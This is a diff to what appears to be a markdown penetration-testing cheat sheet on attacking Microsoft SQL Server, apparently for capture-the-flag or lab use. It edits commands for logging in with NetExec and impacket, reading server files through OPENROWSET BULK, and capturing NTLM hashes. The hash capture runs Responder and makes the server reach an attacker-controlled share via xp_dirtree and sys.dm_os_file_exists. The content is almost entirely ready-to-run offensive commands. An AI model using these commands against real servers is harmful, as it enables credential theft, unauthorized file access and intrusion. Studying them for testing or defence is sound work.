@@ -15,11 +15,13 @@ excerpt: "Technical understanding and practical overview"
 
 ###  [+]  Connecting to mssqlclient 
 ```bash
-   nxc mssql $target -u '$user' -p '$pass' --local-auth
+NetExec mssql $target -u '$user' -p '$pass' --local-auth
 
-   impacket-mssqlclient  -windows-auth $Domain/$user:'$pass'@Domain
+impacket-mssqlclient  -windows-auth $Domain/$user:'$pass'@Domain
     
-   impacket-mssqlclient $full_Domain/$user:'$pass'@Domain
+impacket-mssqlclient $full_Domain/$user:'$pass'@Domain
+
+mssqlclient.py $Domain/$user:$passwd@$Ip -windows-auth
 ```
 ### Comman usage
 ```bash
@@ -62,15 +64,19 @@ nxc mssql DC01 -u '$user' -p 'pass' --local-auth -M mssql_priv
  ```
 ### [-]  Reading  files
 ```bash
-SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
+SELECT * FROM OPENROWSET(BULK 'C:\Windows\system32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
 ```
 
-### [+] Capture NTLM Hash.
+### [+] Capture NTLM Hash. (LLMNR Poisoning)
 ```bash
 responder -I tun0 -dvw
+
  
 declare @q varchar (200);set @q='\\$IP\any\think';exec master.dbo.xp_dirtree @q;
+
 exec master ..xp_dirtree '\\$IP\test';
+
+SELECT * FROM sys.dm_os_file_exists('\\ip\\share\it');
 ```
 ### [+] Checking link_server's
 ```bash
